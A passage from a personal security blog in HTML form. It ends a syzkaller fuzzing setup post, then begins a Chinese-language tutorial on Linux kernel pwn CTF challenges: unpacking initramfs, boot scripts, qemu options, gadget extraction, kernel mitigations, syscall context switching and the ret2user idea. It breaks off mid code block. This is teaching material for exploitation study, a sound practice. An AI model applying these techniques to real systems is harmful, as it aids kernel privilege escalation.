class="string">&quot;/path/to/syzkaller/image/bullseye.id_rsa&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;syzkaller&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;procs&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qemu&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sandbox&quot;</span><span class="punctuation">:</span> <span class="string">&quot;setuid&quot;</span><span class="punctuation">,</span></span><br><span class="line">        	<span class="attr">&quot;enable_syscalls&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">        		<span class="string">&quot;open$testxy&quot;</span><span class="punctuation">,</span></span><br><span class="line">        		<span class="string">&quot;read$testxy&quot;</span><span class="punctuation">,</span></span><br><span class="line">        		<span class="string">&quot;write$testxy&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;vm&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;count&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;kernel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/linux-5.14/arch/x86/boot/bzImage&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;mem&quot;</span><span class="punctuation">:</span> <span class="number">2048</span> <span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;cmdline&quot;</span><span class="punctuation">:</span> <span class="string">&quot;net.ifnames=0&quot;</span> </span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>then run Syzkaller by</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> syzkaller</span><br><span class="line">./bin/syz-manager -config=./test.cfg -debug</span><br></pre></td></tr></table></figure>

<p>visit <a target="_blank" rel="noopener" href="http://127.0.0.1:56741/">http://127.0.0.1:56741/</a> and wait for crash reports</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20241221210627723.png" alt="image-20241221210627723"></p>
<h2 id="0x3-see-also"><a href="#0x3-see-also" class="headerlink" title="0x3 see also"></a>0x3 see also</h2><p><a target="_blank" rel="noopener" href="https://blingblingxuanxuan.github.io/2019/10/26/syzkaller/">https://blingblingxuanxuan.github.io/2019/10/26/syzkaller/</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/11/26/kernel%20rop/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/26/kernel%20rop/" class="post-title-link" itemprop="url">kernel rop</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-11-26 21:17:00" itemprop="dateCreated datePublished" datetime="2024-11-26T21:17:00+08:00">2024-11-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-12-21 21:09:19" itemprop="dateModified" datetime="2024-12-21T21:09:19+08:00">2024-12-21</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="kernel-pwn"><a href="#kernel-pwn" class="headerlink" title="kernel pwn"></a>kernel pwn</h1><h2 id="environment-setup"><a href="#environment-setup" class="headerlink" title="environment setup"></a>environment setup</h2><p>通常<code>linux kernel pwn</code>题目标是在一个有漏洞的内核模块上搞破坏</p>
<p>赛题会给这么几样东西</p>
<p><code>initramfs.cpio.gz</code>或者类似的名字: 内存文件系统, 通常是基于<code>busybox</code>构建的一个最简的<code>linux</code> 文件系统目录, 其中包含有漏洞的内核模块</p>
<p><code>vmlinuz</code>: 内核镜像</p>
<p><code>run.sh</code>: <code>qemu</code>启动脚本,<code>qemu</code>会基于上述<code>vmlinuz</code>和<code>initramfs</code>启动一个虚拟机</p>
<h3 id="initramfs-cpio-gz"><a href="#initramfs-cpio-gz" class="headerlink" title="initramfs.cpio.gz"></a>initramfs.cpio.gz</h3><p>这玩意儿是两层打包之后的文件系统, <code>cpio</code>包外面又套了一个<code>gz</code>包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip initramfs.cpio.gz</span><br></pre></td></tr></table></figure>

<p>得到<code>initramfs.cpio</code>包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idm &lt; ./initramfs.cpio</span><br></pre></td></tr></table></figure>

<p>得到一个<code>linux</code>目录结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop/test<span class="meta"># ls</span></span><br><span class="line">bin  etc  geninitramfs.sh  hackme.ko  init  initramfs.cpio  root  sbin  usr</span><br></pre></td></tr></table></figure>

<p>通常这个目录简单得很</p>
<p><code>hackme.ko</code>: 存在漏洞的内核模块</p>
<p><code>init</code>: 由<code>shell</code>或者<code>c</code>编写的启动脚本</p>
<p><code>bin</code>: 由<code>busybox</code>实现的<code>linux</code>命令集</p>
<p><code>etc</code>: <code>etc</code>下的<code>inittab</code>或者<code>init.d/rcS</code>中有更多的开机启动项目, 比如设置<code>uid</code>或者加载内核模块等</p>
<h4 id="cpio"><a href="#cpio" class="headerlink" title="cpio"></a>cpio</h4><h5 id="cpio是什么"><a href="#cpio是什么" class="headerlink" title="cpio是什么?"></a>cpio是什么?</h5><p><code>CPIO(Copy In Copy Out)</code>, 在早期<code>linux</code>系统中用于将多个文档打包成一个文档传输然后再解包</p>
<h5 id="为什么使用cpio"><a href="#为什么使用cpio" class="headerlink" title="为什么使用cpio?"></a>为什么使用<code>cpio</code>?</h5><p>内核只认<code>cpio</code>打包的<code>initramfs</code>文件包</p>
<h5 id="如何使用cpio"><a href="#如何使用cpio" class="headerlink" title="如何使用cpio?"></a>如何使用<code>cpio</code>?</h5><p><code>cpio</code>命令用起来很诡异, 有各种管道或者重定向符号</p>
<p>这是因为<code>cpio</code>默认从标准输入获取数据, 并输出到标准输出</p>
<p>因此将多个文件打包输出成一个文件需要将标准输入输出重定向到文件流</p>
<p><code>cpio</code>有三种工作模式:<code>copy-out,copy-in，copy-pass</code></p>
<p><code>1.copy-out</code>: 把文件打包, 默认输出到标准输出, 通常重定向到文件, 比如</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../initramfs.cpio.gz</span><br></pre></td></tr></table></figure>

<p>首先查找当前目录下所有文件, 获得文件名列表</p>
<p>​      <code>-print0</code>:文件名以<code>\x00</code>分割</p>
<p>然后管道交给cpio归档</p>
<p>​	<code>--null</code>:文件名以<code>\x00</code>分割</p>
<p>​        <code>-o</code>: 输出</p>
<p>​	<code>-v</code>: verbose, 详细模式, 打印工作过程</p>
<p>​	<code>--format=newc</code> : 以<code>newc</code>格式归档</p>
<p>然后管道交给gzip压缩</p>
<p>​	<code>-9</code>最高压缩级别</p>
<p>然后重定向到文件输出</p>
<p>2.<code>copy-in</code>:解包, 默认从标准输入读包, 通常重定向到文件输入, 比如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idm &lt; ./initramfs.cpio</span><br></pre></td></tr></table></figure>

<p>重定向输入为<code>./initramfs.cpio</code>文件</p>
<p><code>-i</code>: 解包</p>
<p><code>-d</code>: 自动建立相应目录</p>
<p><code>-m</code>: 保留文件修改日期</p>
<p>3.<code>copy-pass</code>: 将一个目录树拷贝到另一个目录下, 只是一个搬运</p>
<h4 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h4><h5 id="etc-inittab"><a href="#etc-inittab" class="headerlink" title="&#x2F;etc&#x2F;inittab"></a>&#x2F;etc&#x2F;inittab</h5><p><code>inittab</code>可以看作<code>init</code>进程的配置文件，规定<code>init</code>进程需要执行的初始化任务</p>
<p><img src="https://images2018.cnblogs.com/blog/1436095/201807/1436095-20180709194017319-1896253481.png" alt="img"></p>
<p><code>inittab</code>中每一行都按照下述语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">label:runlevel:action:process</span><br></pre></td></tr></table></figure>

<p><code>label</code>: 就是一个命名, 给本行登记项一个唯一标识</p>
<p><code>runlevel</code>: 指定任务运行级</p>
<p><code>action</code>: 指定命令执行时机</p>
<p><code>process</code>: 需要执行的<code>shell</code>命令</p>
<p>比如在<code>kernel-rop</code>这道题中是这样写的</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::once:-sh -c <span class="string">&#x27;cat /etc/motd; setuidgid 1000 /bin/sh; poweroff&#x27;</span></span><br></pre></td></tr></table></figure>

<p>1.在系统初始化时执行<code>/etc/init.d/rcS</code></p>
<p>2.执行一次打印<code>/etc/motd</code>然后设置普通用户权限(1000), 然后起低权限的<code>shell</code></p>
<h5 id="etc-init-d-rcS"><a href="#etc-init-d-rcS" class="headerlink" title="&#x2F;etc&#x2F;init.d&#x2F;rcS"></a>&#x2F;etc&#x2F;init.d&#x2F;rcS</h5><p>这个<code>/etc/init.d/rcS</code>干了啥呢?</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">/bin/busybox --install -s			<span class="comment">#在/usr/bin下面创建ls,mkdir等一系列命令,链接到/usr/bin/busybox</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>						<span class="comment">#set tty, 设置终端上打印行为, 挺怪异的</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chown</span> -R 0:0 /						<span class="comment">#所有文件变更拥有者为root</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p /proc &amp;&amp; mount -t proc none /proc</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev  &amp;&amp; mount -t devtmpfs devtmpfs /dev</span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp  &amp;&amp; mount -t tmpfs tmpfs /tmp</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict			<span class="comment">#禁止普通用户查看/proc/kallsyms</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict		<span class="comment">#禁止普通用户查看dmesg信息</span></span><br><span class="line"><span class="built_in">chmod</span> 400 /proc/kallsyms						<span class="comment">#/proc/kallsyms对root只读,其他用户不可访问</span></span><br><span class="line"></span><br><span class="line">insmod /hackme.ko								<span class="comment">#加载内核模块</span></span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/hackme							<span class="comment">#允许所有用户读写访问内核模块hackme.ko的接口/dev/hackme</span></span><br></pre></td></tr></table></figure>

<p>由于<code>inittab</code>中已经将用户限制为普通用户(<code>1000</code>), 此时是看不到<code>dmesg</code>以及<code>kallsym</code>的, </p>
<p>因此可以修改<code>inittab</code>中的用户<code>id</code>,从<code>1000</code>改成0,然后重新打包,启动虚拟机,此时就是<code>root</code>用户了</p>
<h3 id="vmlinuz"><a href="#vmlinuz" class="headerlink" title="vmlinuz"></a>vmlinuz</h3><p><code>vmlinuz </code>就是<code>bzImage</code>,也就是可以引导的内核镜像</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># file vmlinuz</span></span><br><span class="line">vmlinuz: Linux kernel x86 boot executable bzImage, version <span class="number">5.9</span><span class="number">.0</span>-rc6+ (martin@martin) #<span class="number">10</span> SMP Sun Nov <span class="number">22</span> <span class="number">16</span>:<span class="number">47</span>:<span class="number">32</span> CET <span class="number">2020</span>, RO-rootFS, swap_dev <span class="number">0X7</span>, Normal VGA</span><br></pre></td></tr></table></figure>

<p><code>vmlinux</code>是内核<code>elf</code>文件, 而<code>vmlinuz</code>是可引导的, 经过压缩的内核</p>
<p>为了提取内核中的<code>gadget</code>, 我们需要有<code>vmlinux elf</code>文件</p>
<p>可以使用<code>vmlinux-to-elf</code>或者<code>extract-vmlinux</code>工具从<code>vmlinuz</code>中提取<code>vmlinux</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/marin-m/vmlinux-to-elf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmlinux-to-elf ./vmlinuz ./vmlinux</span><br></pre></td></tr></table></figure>

<p>提取完成后生成vmlinux elf文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop# file vmlinuz</span><br><span class="line">vmlinuz: Linux kernel x86 boot executable bzImage, version 5.9.0-rc6+ (martin@martin) <span class="comment">#10 SMP Sun Nov 22 16:47:32 CET 2020, RO-rootFS, swap_dev 0X7, Normal VGA</span></span><br><span class="line">root@Destroyer:/usr/src/kernel-rop# file vmlinux</span><br><span class="line">vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), too many program (36106)</span><br></pre></td></tr></table></figure>

<p>接下来使用<code>ROPgadget</code>提取<code>vmlinux</code>中的<code>gadgets</code>,写入文件准备使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./vmlinux &gt; ./gadgets</span><br></pre></td></tr></table></figure>

<p>有一说一, ROPgadget是真慢吧, 用这个ropr快的跟马一样</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/Ben-Lichtman/ropr</span></span><br></pre></td></tr></table></figure>



<h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><p>qemu启动虚拟机的脚本</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 128M \							<span class="comment">#内存大小为128MB</span></span><br><span class="line">    -cpu kvm64,+smep,+smap \			<span class="comment">#cpu采用kvm64模型,开启smep和smap保护</span></span><br><span class="line">    -kernel vmlinuz \					<span class="comment">#使用vmlinuz作为内核镜像</span></span><br><span class="line">    -initrd initramfs.cpio.gz \			<span class="comment">#指定内存文件系统</span></span><br><span class="line">    -hdb flag.txt \						<span class="comment">#指定虚拟硬盘</span></span><br><span class="line">    -snapshot \							<span class="comment">#快照模式,不会修改虚拟硬盘内容,只会修改内存</span></span><br><span class="line">    -nographic \						<span class="comment">#不使用图形界面</span></span><br><span class="line">    -monitor /dev/null \				<span class="comment">#禁用qemu monitor接口,实际上是将其重定向到垃圾桶</span></span><br><span class="line">    -no-reboot \						<span class="comment">#即使内核崩溃也不重启</span></span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 kaslr kpti=1 quiet panic=1&quot;</span>	<span class="comment">#额外启动参数,指定控制台设备,开启kaslr,kpti</span></span><br></pre></td></tr></table></figure>

<p>如果需要调试内核,还得加上<code>-s</code>选项,启动<code>gdb</code>调试功能</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -kernel vmlinuz \</span><br><span class="line">    -initrd initramfs.cpio.gz \</span><br><span class="line">    -hda flag.txt \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 kaslr kpti=1 quiet panic=1&quot;</span>\</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure>

<p>默认会在本机1234端口上监听gdb附加调试</p>
<p>如果不想使用gef,pwndbg等插件,只使用裸gdb调试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb --nx vmlinux</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>



<h2 id="kernel-mitigation-features"><a href="#kernel-mitigation-features" class="headerlink" title="kernel mitigation features"></a>kernel mitigation features</h2><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p><code>canary</code>: 内核堆栈金丝雀</p>
<h3 id="kaslr"><a href="#kaslr" class="headerlink" title="kaslr"></a>kaslr</h3><p><code>kaslr</code>: 内核地址随机化</p>
<h4 id="FG-KASLR"><a href="#FG-KASLR" class="headerlink" title="FG-KASLR"></a>FG-KASLR</h4><p>函数kaslr</p>
<p>不光内核镜像整体基地址会变</p>
<p>代码段的一些函数也会随机变位置</p>
<h3 id="smep"><a href="#smep" class="headerlink" title="smep"></a>smep</h3><p><code>smep(supervisor mode execution protection)</code>: 内核态时不允许执行用户空间代码</p>
<blockquote>
<p><code>CR4</code>第<code>20</code>位置<code>1</code></p>
<p>开启: <code>-cpu +smep</code></p>
<p>关闭: <code>-append nosmep</code></p>
</blockquote>
<h3 id="smap"><a href="#smap" class="headerlink" title="smap"></a>smap</h3><p><code>smap(supervisor mode access prevention)</code>: 内核态时不允许访问用户空间数据</p>
<blockquote>
<p>CR4第21位置1</p>
<p>开启: <code>-cpu +smap</code></p>
<p>关闭: <code>-append nosmap</code></p>
</blockquote>
<h3 id="kpti"><a href="#kpti" class="headerlink" title="kpti"></a>kpti</h3><p><code>kpti(kernel page table isolation)</code>, 内核页表隔离</p>
<p>开启时启用两张页表, 在内核态时的页表包含了内核空间与用户空间</p>
<p>在用户态时的页表是只有用户空间的拷贝</p>
<p>开启<code>-append kpti=1</code></p>
<p>关闭<code>-append nopti</code></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/476px-Kernel_page-table_isolation.svg.png" alt="File:Kernel page-table isolation.svg"></p>
<h2 id="context-switch"><a href="#context-switch" class="headerlink" title="context switch"></a>context switch</h2><p>以系统调用与其返回过程为例, 观察上下文切换过程</p>
<h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><p>以write为例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//write @ linux0.12/lib/write.c</span></span><br><span class="line">_syscall3(<span class="type">int</span>, write, <span class="type">int</span>, fd, <span class="type">const</span> <span class="type">char</span> *, buf, <span class="type">off_t</span>, count)</span><br></pre></td></tr></table></figure>

<p><code>__syscalln</code>表示有n个参数的系统调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//_syscall3 @ linux0.12/include/unistd.h</span></span><br><span class="line"><span class="comment">/* 有3个参数的系统调用函数	type_name(atype a,btype b,ctype c) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _syscall3(type, name, atype, a, btype, b, ctype, c) \</span></span><br><span class="line"><span class="meta">type name(atype a, btype b, ctype c) 				\</span></span><br><span class="line"><span class="meta">&#123; 													\</span></span><br><span class="line"><span class="meta">	long __res; 									\</span></span><br><span class="line"><span class="meta">	__asm__ volatile (<span class="string">&quot;int $0x80&quot;</span>					\</span></span><br><span class="line"><span class="meta">		: <span class="string">&quot;=a&quot;</span> (__res) 								\</span></span><br><span class="line"><span class="meta">		: <span class="string">&quot;0&quot;</span> (__NR_##name), <span class="string">&quot;b&quot;</span> ((long)(a)), <span class="string">&quot;c&quot;</span> ((long)(b)), <span class="string">&quot;d&quot;</span> ((long)(c))); \</span></span><br><span class="line"><span class="meta">	<span class="keyword">if</span> (__res &gt;= 0) 								\</span></span><br><span class="line"><span class="meta">		return (type) __res; 						\</span></span><br><span class="line"><span class="meta">	errno = -__res; 								\</span></span><br><span class="line"><span class="meta">	return -1; 										\</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>

<p>实际上调用约定:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax = __NR_write 	(write的系统调用号)</span><br><span class="line">rbx = fd 			(第一个参数)</span><br><span class="line">rcx = buf 			(第二个参数)</span><br><span class="line">rdx = count 		(第三个参数)</span><br></pre></td></tr></table></figure>

<p>然后执行<code>int 0x80</code>指令,</p>
<blockquote>
<p>所有的<code>int n</code>指令,都对应到<code>IDT(Interrupt Describetor Table)</code><strong>中断描述符表</strong>中的一个门</p>
<p><code>IDT</code>表共有<code>256</code>个表项,也就是说<code>int n</code>这里的<code>n</code>能够允许的范围是<code>0~255</code></p>
<p>其中0~31项保留给CPU定义的异常和中断, 也就是内部中断或异常</p>
<p>​	比如int 0 表示除法出错, 也就是DIV出错</p>
<p>​	比如int 3 表示断点命中</p>
<p>32~255保留给用户或者设备, 也就是外部中断或者异常</p>
<p>​	比如int 0x80 表示系统调用</p>
<p>IDT表中有三类表项, 中断门,陷阱门,任务门</p>
</blockquote>
<p><code>int 0x80</code>这条指令在<code>sched_init @ kernel/shed.c</code>中被注册为陷阱门</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sched_init @ kernel/shed.c</span></span><br><span class="line">set_system_gate(<span class="number">0x80</span>,&amp;system_call);	</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_system_gate(n, addr) 	_set_gate(&amp;idt[n], 15, 3, addr)</span></span><br></pre></td></tr></table></figure>

<p>在该陷阱门中<code>system_call</code>函数被注册为中断处理过程</p>
<blockquote>
<p> <code>system_call</code>在<code>kernel/sys_call.s</code>中被定义为一个函数, 是所有系统调用的入口, 以eax寄存器值作为系统调用号索引对应系统调用函数</p>
</blockquote>
<p><code>int 0x80</code>过程:</p>
<p>1.由<code>IDTR</code>寄存器查到<code>IDT</code>表基地址</p>
<p>2.以<code>0x80</code>作为索引查<code>IDT</code>表得到<code>IDT[0x80]</code>门, 是一个陷阱门</p>
<p>3.<code>IDT[0x80]</code>中获得(中断处理过程所在段的)段选择子, 陷阱门<code>DPL</code>, (中断处理过程在其)段中的偏移量</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241120152851772.png" alt="image-20241120152851772"></p>
<p>4.由段选择子查<code>LDT</code>或者<code>GDT</code>表获得中断处理过程<code>system_call</code>所在段</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241120153036405.png" alt="image-20241120153036405"></p>
<p>然后段基地址加上<code>IDT</code>中保留的偏移量找到<code>system_call</code>函数地址</p>
<p>5.在调用<code>system_call</code>函数之前, 需要考虑前后段属性是否有改变</p>
<p>对于系统调用来说, 是从3环上经过陷阱门调用<code>0</code>环上的<code>system_call</code>, 段权限发生了变化</p>
<p>因此首先切换堆栈, 从用户堆栈切换到内核堆栈, 切换过程:</p>
<p>​	(1) 从当前用户任务的TSS段中得到<code>0</code>环堆栈的段地址<code>ss0</code>和栈顶指针<code>esp0</code></p>
<p>​	(2) <code>ss3:esp3</code>更换为<code>ss0:esp0</code></p>
<p>​	(3) <code>ss3:esp3</code>压到新栈中保存, <code>eflags, cs:eip </code>也依次压入新栈</p>
<p>​	(4) 异常产生的错误号压栈(如果有的话)</p>
<p>对于同级的中断,比如内核中执行时遭遇除零异常等,不会发生堆栈切换</p>
<p>​	(1)<code>eflags, cs:eip</code> 压栈</p>
<p>​	(2)异常产生的错误号压栈(如果有的话)</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241120155553711.png" alt="image-20241120155553711"></p>
<p>6.此后就运行在内核态的<code>system_call</code>函数中了</p>
<p>7.当<code>system_call</code>要返回时,最后会有一条<code>iret</code>指令,而不是普通的<code>ret</code>指令</p>
<p>此时内核栈或者说<code>0</code>环栈上的状态, 和刚进入<code>system_call</code>时相同,</p>
<p><code>iret</code> 指令会根据栈顶上的内容还原到之前的用户程序中</p>
<blockquote>
<p> <code>ret2user</code>的原理就是在内核堆栈中伪造一个假的用户上下文,让<code>iret</code>返回到攻击者期望的用户程序中</p>
</blockquote>
<h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><p>x64上的系统调用不再使用中断向量表, 也就是说不会再使用<code>int</code>系指令 </p>
<p>x64上引入了新的中断机制, 叫做APIC, 并且给系统调用实现了专门的<code>syscall</code>指令, </p>
<p>必须将系统调用入口函数<code>entry_SYSCALL_64</code>的地址, 注册到<code>MSR</code>寄存器中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@linux5.13/arch/x86/kernel/cpu/common.c/syscall_init.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">syscall_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	wrmsr(MSR_STAR, <span class="number">0</span>, (__USER32_CS &lt;&lt; <span class="number">16</span>) | __KERNEL_CS);</span><br><span class="line">	wrmsrl(MSR_LSTAR, (<span class="type">unsigned</span> <span class="type">long</span>)entry_SYSCALL_64);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>



<p>此后syscall指令会查MSR寄存器,跳到<code>entry_SYSCALL_64</code>中执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 